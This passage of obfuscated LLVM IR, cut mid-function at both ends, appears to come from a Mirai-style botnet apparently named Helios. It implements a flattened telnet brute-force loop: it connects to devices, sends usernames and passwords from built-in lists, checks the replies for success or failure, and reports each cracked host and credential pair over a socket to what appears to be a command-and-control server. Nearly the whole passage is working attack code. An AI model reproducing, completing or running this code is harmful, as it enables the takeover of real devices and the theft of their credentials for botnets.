  %225 = sext i32 %224 to i64
  %226 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %37, i64 %225
  %227 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %226, i32 0, i32 0
  %228 = load i32, i32* %227, align 16
  %229 = call i32 (i32, i32, ...) @fcntl(i32 %228, i32 3, i8* null)
  %230 = or i32 %229, 2048
  %231 = call i32 (i32, i32, ...) @fcntl(i32 %223, i32 4, i32 %230)
  %232 = load i32, i32* %5, align 4
  %233 = sext i32 %232 to i64
  %234 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %37, i64 %233
  %235 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %234, i32 0, i32 0
  %236 = load i32, i32* %235, align 16
  %237 = bitcast %struct.sockaddr_in* %18 to %struct.sockaddr*
  %238 = call i32 @connect(i32 %236, %struct.sockaddr* %237, i32 16)
  %239 = icmp eq i32 %238, -1
  %240 = select i1 %239, i32 -970136630, i32 1911941460
  store i32 %240, i32* %switchVar
  br label %loopEnd

; <label>:241:                                    ; preds = %loopEntry
  %242 = call i32* @__errno_location() #13
  %243 = load i32, i32* %242, align 4
  %244 = icmp ne i32 %243, 115
  %245 = select i1 %244, i32 537746205, i32 1911941460
  store i32 %245, i32* %switchVar
  br label %loopEnd

; <label>:246:                                    ; preds = %loopEntry
  %247 = load i32, i32* %5, align 4
  %248 = sext i32 %247 to i64
  %249 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %37, i64 %248
  call void @reset_telstate(%struct.telstate_t* %249)
  store i32 799439028, i32* %switchVar
  br label %loopEnd

; <label>:250:                                    ; preds = %loopEntry
  %251 = load i32, i32* %5, align 4
  %252 = sext i32 %251 to i64
  %253 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %37, i64 %252
  call void @advance_state(%struct.telstate_t* %253, i32 1)
  store i32 799439028, i32* %switchVar
  br label %loopEnd

; <label>:254:                                    ; preds = %loopEntry
  store i32 171604049, i32* %switchVar
  br label %loopEnd

; <label>:255:                                    ; preds = %loopEntry
  store i32 -755121397, i32* %switchVar
  br label %loopEnd

; <label>:256:                                    ; preds = %loopEntry
  %257 = getelementptr inbounds %struct.__sigset_t, %struct.__sigset_t* %12, i32 0, i32 0
  %258 = getelementptr inbounds [16 x i64], [16 x i64]* %257, i64 0, i64 0
  %259 = call { i64, i64* } asm sideeffect "cld; rep; stosq", "={cx},={di},{ax},0,1,~{memory},~{dirflag},~{fpsr},~{flags}"(i32 0, i64 16, i64* %258) #2, !srcloc !6
  %260 = extractvalue { i64, i64* } %259, 0
  %261 = extractvalue { i64, i64* } %259, 1
  %262 = trunc i64 %260 to i32
  store i32 %262, i32* %21, align 4
  %263 = ptrtoint i64* %261 to i64
  %264 = trunc i64 %263 to i32
  store i32 %264, i32* %22, align 4
  store i32 607950670, i32* %switchVar
  br label %loopEnd

; <label>:265:                                    ; preds = %loopEntry
  store i32 -68482607, i32* %switchVar
  br label %loopEnd

; <label>:266:                                    ; preds = %loopEntry
  %267 = load i32, i32* %5, align 4
  %268 = sext i32 %267 to i64
  %269 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %37, i64 %268
  %270 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %269, i32 0, i32 0
  %271 = load i32, i32* %270, align 16
  %272 = srem i32 %271, 64
  %273 = zext i32 %272 to i64
  %274 = shl i64 1, %273
  %275 = getelementptr inbounds %struct.__sigset_t, %struct.__sigset_t* %12, i32 0, i32 0
  %276 = load i32, i32* %5, align 4
  %277 = sext i32 %276 to i64
  %278 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %37, i64 %277
  %279 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %278, i32 0, i32 0
  %280 = load i32, i32* %279, align 16
  %281 = sdiv i32 %280, 64
  %282 = sext i32 %281 to i64
  %283 = getelementptr inbounds [16 x i64], [16 x i64]* %275, i64 0, i64 %282
  %284 = load i64, i64* %283, align 8
  %285 = or i64 %284, %274
  store i64 %285, i64* %283, align 8
  %286 = getelementptr inbounds %struct.timeval, %struct.timeval* %13, i32 0, i32 0
  store i64 0, i64* %286, align 8
  %287 = load i32, i32* %3, align 4
  %288 = sext i32 %287 to i64
  %289 = getelementptr inbounds %struct.timeval, %struct.timeval* %13, i32 0, i32 1
  store i64 %288, i64* %289, align 8
  %290 = load i32, i32* %5, align 4
  %291 = sext i32 %290 to i64
  %292 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %37, i64 %291
  %293 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %292, i32 0, i32 0
  %294 = load i32, i32* %293, align 16
  %295 = add nsw i32 %294, 1
  %296 = call i32 @select(i32 %295, %struct.__sigset_t* null, %struct.__sigset_t* %12, %struct.__sigset_t* null, %struct.timeval* %13)
  store i32 %296, i32* %6, align 4
  %297 = load i32, i32* %6, align 4
  %298 = icmp eq i32 %297, 1
  %299 = select i1 %298, i32 355637277, i32 456927858
  store i32 %299, i32* %switchVar
  br label %loopEnd

; <label>:300:                                    ; preds = %loopEntry
  store i32 4, i32* %14, align 4
  store i32 0, i32* %15, align 4
  %301 = load i32, i32* %5, align 4
  %302 = sext i32 %301 to i64
  %303 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %37, i64 %302
  %304 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %303, i32 0, i32 0
  %305 = load i32, i32* %304, align 16
  %306 = bitcast i32* %15 to i8*
  %307 = call i32 @getsockopt(i32 %305, i32 1, i32 4, i8* %306, i32* %14) #2
  %308 = load i32, i32* %15, align 4
  %309 = icmp ne i32 %308, 0
  %310 = select i1 %309, i32 -529905128, i32 -1330042048
  store i32 %310, i32* %switchVar
  br label %loopEnd

; <label>:311:                                    ; preds = %loopEntry
  %312 = load i32, i32* %5, align 4
  %313 = sext i32 %312 to i64
  %314 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %37, i64 %313
  call void @reset_telstate(%struct.telstate_t* %314)
  store i32 -1792543510, i32* %switchVar
  br label %loopEnd

; <label>:315:                                    ; preds = %loopEntry
  %316 = load i32, i32* %5, align 4
  %317 = sext i32 %316 to i64
  %318 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %37, i64 %317
  %319 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %318, i32 0, i32 0
  %320 = load i32, i32* %319, align 16
  %321 = load i32, i32* %5, align 4
  %322 = sext i32 %321 to i64
  %323 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %37, i64 %322
  %324 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %323, i32 0, i32 0
  %325 = load i32, i32* %324, align 16
  %326 = call i32 (i32, i32, ...) @fcntl(i32 %325, i32 3, i8* null)
  %327 = and i32 %326, -2049
  %328 = call i32 (i32, i32, ...) @fcntl(i32 %320, i32 4, i32 %327)
  %329 = load i32, i32* %5, align 4
  %330 = sext i32 %329 to i64
  %331 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %37, i64 %330
  call void @advance_state(%struct.telstate_t* %331, i32 2)
  store i32 -1792543510, i32* %switchVar
  br label %loopEnd

; <label>:332:                                    ; preds = %loopEntry
  store i32 -332457352, i32* %switchVar
  br label %loopEnd

; <label>:333:                                    ; preds = %loopEntry
  %334 = load i32, i32* %6, align 4
  %335 = icmp eq i32 %334, -1
  %336 = select i1 %335, i32 998506845, i32 786222391
  store i32 %336, i32* %switchVar
  br label %loopEnd

; <label>:337:                                    ; preds = %loopEntry
  %338 = load i32, i32* %5, align 4
  %339 = sext i32 %338 to i64
  %340 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %37, i64 %339
  call void @reset_telstate(%struct.telstate_t* %340)
  store i32 -332457352, i32* %switchVar
  br label %loopEnd

; <label>:341:                                    ; preds = %loopEntry
  store i32 -175414762, i32* %switchVar
  br label %loopEnd

; <label>:342:                                    ; preds = %loopEntry
  %343 = load i32, i32* %5, align 4
  %344 = sext i32 %343 to i64
  %345 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %37, i64 %344
  %346 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %345, i32 0, i32 7
  %347 = load i32, i32* %346, align 16
  %348 = add i32 %347, 5
  %349 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null)
  %350 = icmp ult i32 %348, %349
  %351 = select i1 %350, i32 -1230168167, i32 -1738427408
  store i32 %351, i32* %switchVar
  br label %loopEnd

; <label>:352:                                    ; preds = %loopEntry
  %353 = load i32, i32* %5, align 4
  %354 = sext i32 %353 to i64
  %355 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %37, i64 %354
  call void @reset_telstate(%struct.telstate_t* %355)
  store i32 -1738427408, i32* %switchVar
  br label %loopEnd

; <label>:356:                                    ; preds = %loopEntry
  store i32 171604049, i32* %switchVar
  br label %loopEnd

; <label>:357:                                    ; preds = %loopEntry
  %358 = load i32, i32* %5, align 4
  %359 = sext i32 %358 to i64
  %360 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %37, i64 %359
  %361 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %360, i32 0, i32 0
  %362 = load i32, i32* %361, align 16
  %363 = load i32, i32* %3, align 4
  %364 = load i32, i32* %5, align 4
  %365 = sext i32 %364 to i64
  %366 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %37, i64 %365
  %367 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %366, i32 0, i32 9
  %368 = load i8*, i8** %367, align 8
  %369 = call i32 @read_until_response(i32 %362, i32 %363, i8* %368, i32 1024, i8** getelementptr inbounds ([5 x i8*], [5 x i8*]* @advances, i32 0, i32 0))
  %370 = icmp ne i32 %369, 0
  %371 = select i1 %370, i32 111908397, i32 -811507563
  store i32 %371, i32* %switchVar
  br label %loopEnd

; <label>:372:                                    ; preds = %loopEntry
  %373 = load i32, i32* %5, align 4
  %374 = sext i32 %373 to i64
  %375 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %37, i64 %374
  %376 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %375, i32 0, i32 9
  %377 = load i8*, i8** %376, align 8
  %378 = call i32 @contains_fail(i8* %377)
  %379 = icmp ne i32 %378, 0
  %380 = select i1 %379, i32 165265050, i32 2043428376
  store i32 %380, i32* %switchVar
  br label %loopEnd

; <label>:381:                                    ; preds = %loopEntry
  %382 = load i32, i32* %5, align 4
  %383 = sext i32 %382 to i64
  %384 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %37, i64 %383
  call void @advance_state(%struct.telstate_t* %384, i32 0)
  store i32 649453780, i32* %switchVar
  br label %loopEnd

; <label>:385:                                    ; preds = %loopEntry
  %386 = load i32, i32* %5, align 4
  %387 = sext i32 %386 to i64
  %388 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %37, i64 %387
  call void @advance_state(%struct.telstate_t* %388, i32 3)
  store i32 649453780, i32* %switchVar
  br label %loopEnd

; <label>:389:                                    ; preds = %loopEntry
  store i32 -332457352, i32* %switchVar
  br label %loopEnd

; <label>:390:                                    ; preds = %loopEntry
  %391 = load i32, i32* %5, align 4
  %392 = sext i32 %391 to i64
  %393 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %37, i64 %392
  %394 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %393, i32 0, i32 7
  %395 = load i32, i32* %394, align 16
  %396 = add i32 %395, 7
  %397 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null)
  %398 = icmp ult i32 %396, %397
  %399 = select i1 %398, i32 306613098, i32 -1267617176
  store i32 %399, i32* %switchVar
  br label %loopEnd

; <label>:400:                                    ; preds = %loopEntry
  %401 = load i32, i32* %5, align 4
  %402 = sext i32 %401 to i64
  %403 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %37, i64 %402
  call void @reset_telstate(%struct.telstate_t* %403)
  store i32 -1267617176, i32* %switchVar
  br label %loopEnd

; <label>:404:                                    ; preds = %loopEntry
  store i32 171604049, i32* %switchVar
  br label %loopEnd

; <label>:405:                                    ; preds = %loopEntry
  %406 = load i32, i32* %5, align 4
  %407 = sext i32 %406 to i64
  %408 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %37, i64 %407
  %409 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %408, i32 0, i32 0
  %410 = load i32, i32* %409, align 16
  %411 = load i32, i32* %5, align 4
  %412 = sext i32 %411 to i64
  %413 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %37, i64 %412
  %414 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %413, i32 0, i32 4
  %415 = load i8, i8* %414, align 2
  %416 = zext i8 %415 to i64
  %417 = getelementptr inbounds [9 x i8*], [9 x i8*]* @usernames, i64 0, i64 %416
  %418 = load i8*, i8** %417, align 8
  %419 = load i32, i32* %5, align 4
  %420 = sext i32 %419 to i64
  %421 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %37, i64 %420
  %422 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %421, i32 0, i32 4
  %423 = load i8, i8* %422, align 2
  %424 = zext i8 %423 to i64
  %425 = getelementptr inbounds [9 x i8*], [9 x i8*]* @usernames, i64 0, i64 %424
  %426 = load i8*, i8** %425, align 8
  %427 = call i64 @strlen(i8* %426) #10
  %428 = call i64 @send(i32 %410, i8* %418, i64 %427, i32 16384)
  %429 = icmp slt i64 %428, 0
  %430 = select i1 %429, i32 -1776185520, i32 1595482448
  store i32 %430, i32* %switchVar
  br label %loopEnd

; <label>:431:                                    ; preds = %loopEntry
  %432 = load i32, i32* %5, align 4
  %433 = sext i32 %432 to i64
  %434 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %37, i64 %433
  call void @reset_telstate(%struct.telstate_t* %434)
  store i32 -332457352, i32* %switchVar
  br label %loopEnd

; <label>:435:                                    ; preds = %loopEntry
  %436 = load i32, i32* %5, align 4
  %437 = sext i32 %436 to i64
  %438 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %37, i64 %437
  %439 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %438, i32 0, i32 0
  %440 = load i32, i32* %439, align 16
  %441 = call i64 @send(i32 %440, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.347, i32 0, i32 0), i64 2, i32 16384)
  %442 = icmp slt i64 %441, 0
  %443 = select i1 %442, i32 -93164642, i32 816603997
  store i32 %443, i32* %switchVar
  br label %loopEnd

; <label>:444:                                    ; preds = %loopEntry
  %445 = load i32, i32* %5, align 4
  %446 = sext i32 %445 to i64
  %447 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %37, i64 %446
  call void @reset_telstate(%struct.telstate_t* %447)
  store i32 -332457352, i32* %switchVar
  br label %loopEnd

; <label>:448:                                    ; preds = %loopEntry
  %449 = load i32, i32* %5, align 4
  %450 = sext i32 %449 to i64
  %451 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %37, i64 %450
  call void @advance_state(%struct.telstate_t* %451, i32 4)
  store i32 171604049, i32* %switchVar
  br label %loopEnd

; <label>:452:                                    ; preds = %loopEntry
  %453 = load i32, i32* %5, align 4
  %454 = sext i32 %453 to i64
  %455 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %37, i64 %454
  %456 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %455, i32 0, i32 0
  %457 = load i32, i32* %456, align 16
  %458 = load i32, i32* %3, align 4
  %459 = load i32, i32* %5, align 4
  %460 = sext i32 %459 to i64
  %461 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %37, i64 %460
  %462 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %461, i32 0, i32 9
  %463 = load i8*, i8** %462, align 8
  %464 = call i32 @read_until_response(i32 %457, i32 %458, i8* %463, i32 1024, i8** getelementptr inbounds ([5 x i8*], [5 x i8*]* @advances, i32 0, i32 0))
  %465 = icmp ne i32 %464, 0
  %466 = select i1 %465, i32 1652123587, i32 1456151776
  store i32 %466, i32* %switchVar
  br label %loopEnd

; <label>:467:                                    ; preds = %loopEntry
  %468 = load i32, i32* %5, align 4
  %469 = sext i32 %468 to i64
  %470 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %37, i64 %469
  %471 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %470, i32 0, i32 9
  %472 = load i8*, i8** %471, align 8
  %473 = call i32 @contains_fail(i8* %472)
  %474 = icmp ne i32 %473, 0
  %475 = select i1 %474, i32 512165358, i32 1227768129
  store i32 %475, i32* %switchVar
  br label %loopEnd

; <label>:476:                                    ; preds = %loopEntry
  %477 = load i32, i32* %5, align 4
  %478 = sext i32 %477 to i64
  %479 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %37, i64 %478
  call void @advance_state(%struct.telstate_t* %479, i32 0)
  store i32 1339072099, i32* %switchVar
  br label %loopEnd

; <label>:480:                                    ; preds = %loopEntry
  %481 = load i32, i32* %5, align 4
  %482 = sext i32 %481 to i64
  %483 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %37, i64 %482
  call void @advance_state(%struct.telstate_t* %483, i32 5)
  store i32 1339072099, i32* %switchVar
  br label %loopEnd

; <label>:484:                                    ; preds = %loopEntry
  store i32 -332457352, i32* %switchVar
  br label %loopEnd

; <label>:485:                                    ; preds = %loopEntry
  %486 = load i32, i32* %5, align 4
  %487 = sext i32 %486 to i64
  %488 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %37, i64 %487
  %489 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %488, i32 0, i32 7
  %490 = load i32, i32* %489, align 16
  %491 = add i32 %490, 3
  %492 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null)
  %493 = icmp ult i32 %491, %492
  %494 = select i1 %493, i32 1900288130, i32 767472452
  store i32 %494, i32* %switchVar
  br label %loopEnd

; <label>:495:                                    ; preds = %loopEntry
  %496 = load i32, i32* %5, align 4
  %497 = sext i32 %496 to i64
  %498 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %37, i64 %497
  call void @reset_telstate(%struct.telstate_t* %498)
  store i32 767472452, i32* %switchVar
  br label %loopEnd

; <label>:499:                                    ; preds = %loopEntry
  store i32 171604049, i32* %switchVar
  br label %loopEnd

; <label>:500:                                    ; preds = %loopEntry
  %501 = load i32, i32* %5, align 4
  %502 = sext i32 %501 to i64
  %503 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %37, i64 %502
  %504 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %503, i32 0, i32 0
  %505 = load i32, i32* %504, align 16
  %506 = load i32, i32* %5, align 4
  %507 = sext i32 %506 to i64
  %508 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %37, i64 %507
  %509 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %508, i32 0, i32 5
  %510 = load i8, i8* %509, align 1
  %511 = zext i8 %510 to i64
  %512 = getelementptr inbounds [9 x i8*], [9 x i8*]* @passwords, i64 0, i64 %511
  %513 = load i8*, i8** %512, align 8
  %514 = load i32, i32* %5, align 4
  %515 = sext i32 %514 to i64
  %516 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %37, i64 %515
  %517 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %516, i32 0, i32 5
  %518 = load i8, i8* %517, align 1
  %519 = zext i8 %518 to i64
  %520 = getelementptr inbounds [9 x i8*], [9 x i8*]* @passwords, i64 0, i64 %519
  %521 = load i8*, i8** %520, align 8
  %522 = call i64 @strlen(i8* %521) #10
  %523 = call i64 @send(i32 %505, i8* %513, i64 %522, i32 16384)
  %524 = icmp slt i64 %523, 0
  %525 = select i1 %524, i32 663310553, i32 155063704
  store i32 %525, i32* %switchVar
  br label %loopEnd

; <label>:526:                                    ; preds = %loopEntry
  %527 = load i32, i32* %5, align 4
  %528 = sext i32 %527 to i64
  %529 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %37, i64 %528
  call void @reset_telstate(%struct.telstate_t* %529)
  store i32 -332457352, i32* %switchVar
  br label %loopEnd

; <label>:530:                                    ; preds = %loopEntry
  %531 = load i32, i32* %5, align 4
  %532 = sext i32 %531 to i64
  %533 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %37, i64 %532
  %534 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %533, i32 0, i32 0
  %535 = load i32, i32* %534, align 16
  %536 = call i64 @send(i32 %535, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.347, i32 0, i32 0), i64 2, i32 16384)
  %537 = icmp slt i64 %536, 0
  %538 = select i1 %537, i32 1084221214, i32 1284414939
  store i32 %538, i32* %switchVar
  br label %loopEnd

; <label>:539:                                    ; preds = %loopEntry
  %540 = load i32, i32* %5, align 4
  %541 = sext i32 %540 to i64
  %542 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %37, i64 %541
  call void @reset_telstate(%struct.telstate_t* %542)
  store i32 -332457352, i32* %switchVar
  br label %loopEnd

; <label>:543:                                    ; preds = %loopEntry
  %544 = load i32, i32* %5, align 4
  %545 = sext i32 %544 to i64
  %546 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %37, i64 %545
  call void @advance_state(%struct.telstate_t* %546, i32 6)
  store i32 171604049, i32* %switchVar
  br label %loopEnd

; <label>:547:                                    ; preds = %loopEntry
  %548 = load i32, i32* %5, align 4
  %549 = sext i32 %548 to i64
  %550 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %37, i64 %549
  %551 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %550, i32 0, i32 0
  %552 = load i32, i32* %551, align 16
  %553 = load i32, i32* %3, align 4
  %554 = load i32, i32* %5, align 4
  %555 = sext i32 %554 to i64
  %556 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %37, i64 %555
  %557 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %556, i32 0, i32 9
  %558 = load i8*, i8** %557, align 8
  %559 = call i32 @read_until_response(i32 %552, i32 %553, i8* %558, i32 1024, i8** getelementptr inbounds ([11 x i8*], [11 x i8*]* @advances2, i32 0, i32 0))
  %560 = icmp ne i32 %559, 0
  %561 = select i1 %560, i32 -1790598291, i32 1163361059
  store i32 %561, i32* %switchVar
  br label %loopEnd

; <label>:562:                                    ; preds = %loopEntry
  %563 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null)
  %564 = load i32, i32* %5, align 4
  %565 = sext i32 %564 to i64
  %566 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %37, i64 %565
  %567 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %566, i32 0, i32 7
  store i32 %563, i32* %567, align 16
  %568 = load i32, i32* %5, align 4
  %569 = sext i32 %568 to i64
  %570 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %37, i64 %569
  %571 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %570, i32 0, i32 9
  %572 = load i8*, i8** %571, align 8
  %573 = call i32 @contains_fail(i8* %572)
  %574 = icmp ne i32 %573, 0
  %575 = select i1 %574, i32 1139478033, i32 -199974523
  store i32 %575, i32* %switchVar
  br label %loopEnd

; <label>:576:                                    ; preds = %loopEntry
  %577 = load i32, i32* %5, align 4
  %578 = sext i32 %577 to i64
  %579 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %37, i64 %578
  call void @advance_state(%struct.telstate_t* %579, i32 0)
  store i32 1801626177, i32* %switchVar
  br label %loopEnd

; <label>:580:                                    ; preds = %loopEntry
  %581 = load i32, i32* %5, align 4
  %582 = sext i32 %581 to i64
  %583 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %37, i64 %582
  %584 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %583, i32 0, i32 9
  %585 = load i8*, i8** %584, align 8
  %586 = call i32 @contains_success(i8* %585)
  %587 = icmp ne i32 %586, 0
  %588 = select i1 %587, i32 -421558847, i32 -1510373238
  store i32 %588, i32* %switchVar
  br label %loopEnd

; <label>:589:                                    ; preds = %loopEntry
  %590 = load i32, i32* %5, align 4
  %591 = sext i32 %590 to i64
  %592 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %37, i64 %591
  %593 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %592, i32 0, i32 3
  %594 = load i8, i8* %593, align 1
  %595 = zext i8 %594 to i32
  %596 = icmp eq i32 %595, 2
  %597 = select i1 %596, i32 1998750680, i32 -258228280
  store i32 %597, i32* %switchVar
  br label %loopEnd

; <label>:598:                                    ; preds = %loopEntry
  %599 = load i32, i32* %5, align 4
  %600 = sext i32 %599 to i64
  %601 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %37, i64 %600
  call void @advance_state(%struct.telstate_t* %601, i32 7)
  store i32 -776980334, i32* %switchVar
  br label %loopEnd

; <label>:602:                                    ; preds = %loopEntry
  %603 = load i32, i32* @HeliosCommSock, align 4
  %604 = load i32, i32* %5, align 4
  %605 = sext i32 %604 to i64
  %606 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %37, i64 %605
  %607 = call i8* @get_telstate_host(%struct.telstate_t* %606)
  %608 = load i32, i32* %5, align 4
  %609 = sext i32 %608 to i64
  %610 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %37, i64 %609
  %611 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %610, i32 0, i32 4
  %612 = load i8, i8* %611, align 2
  %613 = zext i8 %612 to i64
  %614 = getelementptr inbounds [9 x i8*], [9 x i8*]* @usernames, i64 0, i64 %613
  %615 = load i8*, i8** %614, align 8
  %616 = load i32, i32* %5, align 4
  %617 = sext i32 %616 to i64
  %618 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %37, i64 %617
  %619 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %618, i32 0, i32 5
  %620 = load i8, i8* %619, align 1
  %621 = zext i8 %620 to i64
  %622 = getelementptr inbounds [9 x i8*], [9 x i8*]* @passwords, i64 0, i64 %621
  %623 = load i8*, i8** %622, align 8
  %624 = call i32 (i32, i8*, ...) @Heliosprintf(i32 %603, i8* getelementptr inbounds ([93 x i8], [93 x i8]* @.str.348, i32 0, i32 0), i8* %607, i8* %615, i8* %623)
  %625 = load i32, i32* %5, align 4
  %626 = sext i32 %625 to i64
  %627 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %37, i64 %626
  call void @advance_state(%struct.telstate_t* %627, i32 7)
  store i32 -776980334, i32* %switchVar
  br label %loopEnd

; <label>:628:                                    ; preds = %loopEntry
  store i32 861906696, i32* %switchVar
  br label %loopEnd

; <label>:629:                                    ; preds = %loopEntry
  %630 = load i32, i32* %5, align 4
  %631 = sext i32 %630 to i64
  %632 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %37, i64 %631
  call void @reset_telstate(%struct.telstate_t* %632)
  store i32 861906696, i32* %switchVar
  br label %loopEnd

; <label>:633:                                    ; preds = %loopEntry
  store i32 1801626177, i32* %switchVar
  br label %loopEnd

; <label>:634:                                    ; preds = %loopEntry
  store i32 -332457352, i32* %switchVar
  br label %loopEnd

; <label>:635:                                    ; preds = %loopEntry
  %636 = load i32, i32* %5, align 4
  %637 = sext i32 %636 to i64
  %638 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %37, i64 %637
  %639 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %638, i32 0, i32 7
  %640 = load i32, i32* %639, align 16
  %641 = add i32 %640, 7
  %642 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null)
  %643 = icmp ult i32 %641, %642
  %644 = select i1 %643, i32 1246628212, i32 1103706153
  store i32 %644, i32* %switchVar
  br label %loopEnd

; <label>:645:                                    ; preds = %loopEntry
  %646 = load i32, i32* %5, align 4
  %647 = sext i32 %646 to i64
  %648 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %37, i64 %647
  call void @reset_telstate(%struct.telstate_t* %648)
  store i32 1103706153, i32* %switchVar
  br label %loopEnd

; <label>:649:                                    ; preds = %loopEntry
  store i32 171604049, i32* %switchVar
  br label %loopEnd

; <label>:650:                                    ; preds = %loopEntry
  %651 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null)
  %652 = load i32, i32* %5, align 4
  %653 = sext i32 %652 to i64
  %654 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %37, i64 %653
  %655 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %654, i32 0, i32 7
  store i32 %651, i32* %655, align 16
  %656 = load i32, i32* %5, align 4
  %657 = sext i32 %656 to i64
  %658 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %37, i64 %657
  %659 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %658, i32 0, i32 0
  %660 = load i32, i32* %659, align 16
  %661 = call i64 @send(i32 %660, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.349, i32 0, i32 0), i64 4, i32 16384)
  %662 = icmp slt i64 %661, 0
  %663 = select i1 %662, i32 1095287080, i32 855503153
  store i32 %663, i32* %switchVar
  br label %loopEnd

; <label>:664:                                    ; preds = %loopEntry
  store i32 855503153, i32* %switchVar
  br label %loopEnd

; <label>:665:                                    ; preds = %loopEntry
  %666 = load i32, i32* %5, align 4
  %667 = sext i32 %666 to i64
  %668 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %37, i64 %667
